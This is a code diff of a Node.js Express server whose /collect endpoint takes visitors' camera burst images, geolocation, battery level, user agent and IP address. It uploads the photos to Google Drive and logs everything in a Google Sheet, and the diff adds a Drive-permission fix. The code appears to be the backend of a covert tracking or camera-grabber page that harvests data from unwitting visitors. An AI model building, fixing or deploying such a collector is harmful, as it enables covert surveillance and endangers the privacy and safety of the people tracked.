@@ -1,33 +1,3 @@
-import 'dotenv/config';
-import express from 'express';
-import { google } from 'googleapis';
-import path from 'path';
-import { fileURLToPath } from 'url';
-import { Readable } from 'stream';
-
-const __dirname = path.dirname(fileURLToPath(import.meta.url));
-const app = express();
-app.use(express.json({ limit: '50mb' }));
-app.use(express.static(__dirname));
-
-// Ensure your private key is formatted correctly for Render
-const privateKey = (process.env.GOOGLE_PRIVATE_KEY || '').replace(/\\n/g, '\n');
-
-const auth = new google.auth.JWT(
-  process.env.GOOGLE_CLIENT_EMAIL,
-  null,
-  privateKey,
-  ['https://www.googleapis.com/auth/spreadsheets', 'https://www.googleapis.com/auth/drive.file']
-);
-
-const drive = google.drive({ version: 'v3', auth });
-const sheets = google.sheets({ version: 'v4', auth });
-
-// YOUR DRIVE FOLDER ID
-const FOLDER_ID = '1Kw94qJ-9DkeZHeiEfe5LwcA9pBTwCXni';
-
-app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
-
 app.post('/collect', async (req, res) => {
   try {
     const { ts, hints, battery, location, burstImages } = req.body;
@@ -46,17 +16,17 @@ app.post('/collect', async (req, res) => {
         mimeType: 'image/jpeg',
         body: Readable.from(buffer)
       },
+      // CRITICAL FIX: This allows the service account to use your folder's space
+      supportsAllDrives: true, 
       fields: 'id, webViewLink'
     });
 
     // 2. Append the data and the new Drive link to the Sheet
     const row = [
-      ts, 
-      ip, 
-      hints?.ua || 'N/A', 
+      ts, ip, hints?.ua || 'N/A', 
       (battery?.levelPercent || 0) + '%', 
       `${location?.lat || 0}, ${location?.lon || 0}`,
-      driveFile.data.webViewLink // This will be a clickable link to the photo
+      driveFile.data.webViewLink 
     ];
 
     await sheets.spreadsheets.values.append({
@@ -66,12 +36,10 @@ app.post('/collect', async (req, res) => {
       requestBody: { values: [row] }
     });
 
-    console.log("✅ Data and Photo Link successfully saved.");
+    console.log("✅ Successfully saved to Drive and Sheet");
     res.json({ ok: true });
   } catch (err) {
     console.error("❌ ERROR:", err.message);
     res.status(500).json({ error: err.message });
   }
 });
-
-app.listen(process.env.PORT || 8080, () => console.log("Server is running..."));
